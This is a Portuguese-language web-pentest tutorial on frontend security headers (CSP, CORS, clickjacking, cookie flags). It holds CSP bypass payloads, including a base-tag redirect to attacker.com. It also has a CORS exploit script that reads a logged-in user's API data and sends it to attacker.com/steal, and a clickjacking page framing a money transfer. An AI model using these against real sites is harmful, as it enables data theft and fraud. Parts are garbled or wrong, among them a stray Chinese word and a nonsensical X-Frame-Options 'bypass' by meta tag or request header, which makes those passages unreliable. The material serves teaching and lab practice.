# Segurança de Aplicações Frontend

> Content Security Policy, CORS, Clickjacking e outras proteções do lado do cliente.

---

## 📚 O que é Segurança de Aplicações Frontend?

**Segurança de Frontend** envolve headers HTTP e configurações do navegador que protegem contra ataques como XSS, Clickjacking e roubo de dados cross-origin. Inclui **CSP**, **CORS**, **X-Frame-Options** e flags de cookies.

### Por que isso é importante?

- Headers de segurança são a **primeira linha de defesa** no navegador
- **CSP** previne XSS — mas configurações ruins podem ser bypassadas
- **CORS** mal configurado permite **roubo de dados** entre domínios
- **Clickjacking** engana o usuário para clicar em ações invisíveis

### Como funciona na prática?

| Header | Proteção contra | Exemplo |
|:---|:---|:---|
| **CSP** | XSS, injeção de código | `default-src 'self'` |
| **CORS** | Roubo cross-origin | `Access-Control-Allow-Origin` |
| **X-Frame-Options** | Clickjacking | `DENY` ou `SAMEORIGIN` |
| **HttpOnly** | Roubo de cookies via XSS | `Set-Cookie: session=abc; HttpOnly` |
| **Secure** | Interceptação de cookies | `Set-Cookie: session=abc; Secure` |

### Ferramentas

| Ferramenta | O que faz |
|:---|:---|
| **curl** | Verificar headers HTTP |
| **Nuclei** | Scan automático de headers |
| **Burp Suite** | Interceptação de tráfego |
| **csp-evaluator** | Analisar configuração CSP |

---

## Instalação das Ferramentas

```bash
# Nuclei (scan de headers de segurança)
sudo apt install -y nuclei
nuclei -update-templates

# curl (já vem no Linux, para testes manuais)

# Burp Suite (proxy para interceptar requests)
# Download: https://portswigger.net/burp/communitydownload
```

---

## Content Security Policy (CSP)

### O que é CSP
CSP é uma camada de segurança que ajuda a prevenir XSS e outros ataques de injeção de código.

### Como Funciona
```bash
# CSP é definido via header HTTP
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

# Ou via meta tag
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

### Diretivas Comuns
```bash
# default-src: política padrão para todos os recursos
default-src 'self'

# script-src: políticas para JavaScript
script-src 'self' 'unsafe-inline' 'unsafe-eval'

# style-src: políticas para CSS
style-src 'self' 'unsafe-inline'

# img-src: políticas para imagens
img-src 'self' data: https:

# font-src: políticas para fontes
font-src 'self' https://fonts.gstatic.com

# connect-src: políticas para conexões (AJAX, WebSocket)
connect-src 'self' https://api.target.com

# frame-src: políticas para iframes
frame-src 'self' https://www.youtube.com
```

### Bypass de CSP

#### 1. Bypass via 'unsafe-inline'
```bash
# Se CSP permite 'unsafe-inline'
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

#### 2. Bypass via 'unsafe-eval'
```bash
# Se CSP permite 'unsafe-eval'
eval('alert(1)')
setTimeout('alert(1)', 0)
setInterval('alert(1)', 0)
```

#### 3. Bypass via Domínios Confiáveis
```bash
# Se CSP permite domínios específicos
# Encontrar bibliotecas com XSS
https://cdn.target.com/lib.js
https://cdn.target.com/lib.min.js

# Usar bibliotecas para injetar código
<script src="https://cdn.target.com/lib.js"></script>
```

#### 4. Bypass via JSONP
```bash
# Se CSP permite domínios com JSONP
<script src="https://api.target.com/callback?data=alert(1)"></script>
```

#### 5. Bypass via Base URL
```bash
# Se CSP permite base-uri
<base href="https://attacker.com/">
<script src="/evil.js"></script>
```

### Ferramentas de Bypass
```bash
# csp-bypass
git clone https://github.com/nicothin/csp-bypass.git
cd csp-bypass
python3 csp-bypass.py -u http://target.com

# CSP Evaluator (Google)
# https://csp-evaluator.withgoogle.com/
```

---

## Cross-Origin Resource Sharing (CORS)

### O que é CORS
CORS define como recursos podem ser requisitados de outro domínio.

### Configurações Perigosas
```bash
# CORS aberto (permite qualquer origem)
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# CORS com反射 (reflete qualquer origem)
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

### Como Testar
```bash
# Testar CORS com origem aleatória
curl -H "Origin: http://attacker.com" -I http://target.com/api/data

# Se retornar:
# Access-Control-Allow-Origin: http://attacker.com
# Access-Control-Allow-Credentials: true
# = CORS vulnerability

# Testar com subdomínio
curl -H "Origin: http://evil.target.com" -I http://target.com/api/data

# Testar com null
curl -H "Origin: null" -I http://target.com/api/data
```

### Bypass de CORS
```bash
# Bypass via subdomínio
curl -H "Origin: http://subdomain.target.com" http://target.com/api/data

# Bypass via prefixo
curl -H "Origin: http://attackertarget.com" http://target.com/api/data

# Bypass via sufixo
curl -H "Origin: http://target.com.attacker.com" http://target.com/api/data

# Bypass via null
curl -H "Origin: null" http://target.com/api/data
```

### Exploitação de CORS
```html
<!-- Extrair dados via CORS -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://target.com/api/user", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    // Enviar dados para attacker
    fetch("https://attacker.com/steal?data=" + btoa(xhr.responseText));
  }
};
xhr.send();
</script>
```

---

## Clickjacking

### O que é Clickjacking
Ataque onde o usuário é enganado para clicar em algo diferente do que pretendia.

### Como Funciona
```html
<!-- Página do atacante -->
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.0001;
    z-index: 2;
  }
  .decoy {
    position: absolute;
    top: 0;
    left: 0;
    width: 700px;
    height: 500px;
    z-index: 1;
  }
</style>

<div class="decoy">
  <button>Clique para ganhar prêmio!</button>
</div>

<iframe src="http://target.com/transfer?to=attacker&amount=10000"></iframe>
```

### Como Testar
```bash
# Verificar se há proteção Clickjacking
curl -I http://target.com/

# Se não retornar X-Frame-Options ou CSP frame-ancestors
# = Clickjacking possível

# Verificar headers de proteção
curl -I http://target.com/ | grep -i "x-frame-options\|frame-ancestors"
```

### Proteções contra Clickjacking

#### X-Frame-Options
```bash
# Bloquear todos os iframes
X-Frame-Options: DENY

# Permitir apenas do mesmo domínio
X-Frame-Options: SAMEORIGIN
```

#### CSP frame-ancestors
```bash
# Bloquear todos os iframes
Content-Security-Policy: frame-ancestors 'none'

# Permitir apenas do mesmo domínio
Content-Security-Policy: frame-ancestors 'self'

# Permitir domínios específicos
Content-Security-Policy: frame-ancestors 'self' https://target.com
```

### Bypass de Proteções
```bash
# Bypass via meta tag
# Se o servidor não bloqueia meta tags
<meta http-equiv="X-Frame-Options" content="DENY">

# Bypass via header HTTP
# Se o servidor não valida o header
curl -H "X-Frame-Options: ALLOW" http://target.com/

# Bypass via CSP
# Se CSP não tem frame-ancestors
```

---

## Cookie Security

### Flags de Segurança
```bash
# HttpOnly - impede acesso via JavaScript
Set-Cookie: session=abc123; HttpOnly

# Secure - envia apenas via HTTPS
Set-Cookie: session=abc123; Secure

# SameSite - previne CSRF
Set-Cookie: session=abc123; SameSite=Strict
Set-Cookie: session=abc123; SameSite=Lax
Set-Cookie: session=abc123; SameSite=None

# Domain - define o domínio
Set-Cookie: session=abc123; domain=.target.com

# Path - define o caminho
Set-Cookie: session=abc123; path=/

# Expiration
Set-Cookie: session=abc123; expires=Thu, 01 Jan 2025 00:00:00 GMT
```

### Como Testar
```bash
# Verificar flags de cookies
curl -I http://target.com/

# Se não retornar HttpOnly = XSS pode roubar cookies
# Se não retornar Secure = cookies podem ser interceptados
# Se não retornar SameSite = CSRF possível
```

### Bypass de HttpOnly
```bash
# Se HttpOnly está configurado, não é possível roubar cookies via XSS
# Mas ainda é possível:
# 1. Roubar dados via AJAX
# 2. Executar ações em nome do usuário
# 3. Redirecionar para phishing
```

---

## Outras Proteções

### X-Content-Type-Options
```bash
# Impede MIME sniffing
X-Content-Type-Options: nosniff

# Se não estiver configurado
# O navegador pode interpretar arquivos incorretamente
```

### Referrer-Policy
```bash
# Controla informações de referrer
Referrer-Policy: no-referrer
Referrer-Policy: same-origin
Referrer-Policy: strict-origin-when-cross-origin

# Se não estiver configurado
# URLs sensíveis podem ser expostas em referrers
```

### Permissions-Policy
```bash
# Controla features do navegador
Permissions-Policy: camera=(), microphone=(), geolocation=()

# Se não estiver configurado
# Sites podem acessar câmera, microfone, localização
```

---

## Lab Prático

### Exercício 1: CSP Bypass
- **Plataforma:** PortSwigger
- **Link:** https://portswigger.net/web-security/content-security-policy
- **O que vai praticar:** Bypass de CSP, XSS via bibliotecas
- **Tempo estimado:** 60 min

### Exercício 2: CORS Misconfiguration
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/cors
- **O que vai praticar:** Testar e explorar CORS
- **Tempo estimado:** 45 min

### Exercício 3: Clickjacking
- **Plataforma:** PortSwigger
- **Link:** https://portswigger.net/web-security/clickjacking
- **O que vai praticar:** Clickjacking, bypass de proteções
- **Tempo estimado:** 30 min

### Dica de Estudo
> CSP é uma das proteções mais importantes. Sempre verifique os headers de segurança de um site antes de testar XSS.

---

**Anterior:** [01-xss-e-csrf.md](01-xss-e-csrf.md)

---

### Resumo da ordem — Por que essa sequência?

Segurança de Aplicações segue: **analisar headers → testar CSP → testar CORS → testar Clickjacking**.

```
PASSO 1: Analisar headers → Verificar proteções HTTP
├── POR QUE: Headers são a primeira linha de defesa do frontend
├── O QUE FAZER: Listar todos os headers de segurança
├── COMANDO: curl -I http://target.com/
├── QUANDO AVANÇAR: Quando tiver lista completa de headers
└── SE DER ERRADO: Se faltarem headers = proteções ausentes = oportunidade

        ↓

PASSO 2: Testar CSP → Verificar Content Security Policy
├── POR QUE: CSP previne XSS — mas configurações ruins podem ser bypassadas
├── O QUE FAZER: Verificar diretivas, testar 'unsafe-inline' e 'unsafe-eval'
├── COMANDO: curl -I http://target.com/ | grep -i content-security-policy
├── QUANDO AVANÇAR: Quando entender o CSP configurado
└── DICAS: Se não tem CSP = XSS mais fácil. Se tem 'unsafe-inline' = bypass possível

        ↓

PASSO 3: Testar CORS → Verificar Cross-Origin Resource Sharing
├── POR QUE: CORS mal configurado permite roubar dados cross-origin
├── O QUE FAZER: Enviar Origin diferente e verificar se é refletido
├── COMANDO: curl -H "Origin: http://attacker.com" -I http://target.com/api/data
├── QUANDO AVANÇAR: Se Access-Control-Allow-Origin refletir sua origin
└── SE DER ERRADO: Se bloquear, tente subdomínio, null, ou prefixo/sufixo

        ↓

PASSO 4: Testar Clickjacking → Verificar se pode embeber a página
├── POR QUE: Clickjacking engana o usuário para clicar em algo invisível
├── O QUE FAZER: Verificar X-Frame-Options e CSP frame-ancestors
├── COMANDO: curl -I http://target.com/ | grep -i "x-frame-options\|frame-ancestors"
├── QUANDO AVANÇAR: Se não retornar proteção = Clickjacking possível
└── DICAS: Teste em páginas de ação (transferência, configurações)

        ↓

PASSO 5: Verificar cookies → Analisar flags de segurança
├── POR QUE: Cookies sem HttpOnly/Secure/SameSite = vulnerabilidades
├── O QUE FAZER: Verificar todas as flags dos cookies
├── COMANDO: curl -I http://target.com/ | grep -i set-cookie
├── QUANDO AVANÇAR: Quando tiver análise completa dos cookies
└── SE DER ERRADO: Se faltar HttpOnly = XSS pode roubar sessão
```

---

**Anterior:** [01-xss-e-csrf.md](01-xss-e-csrf.md)
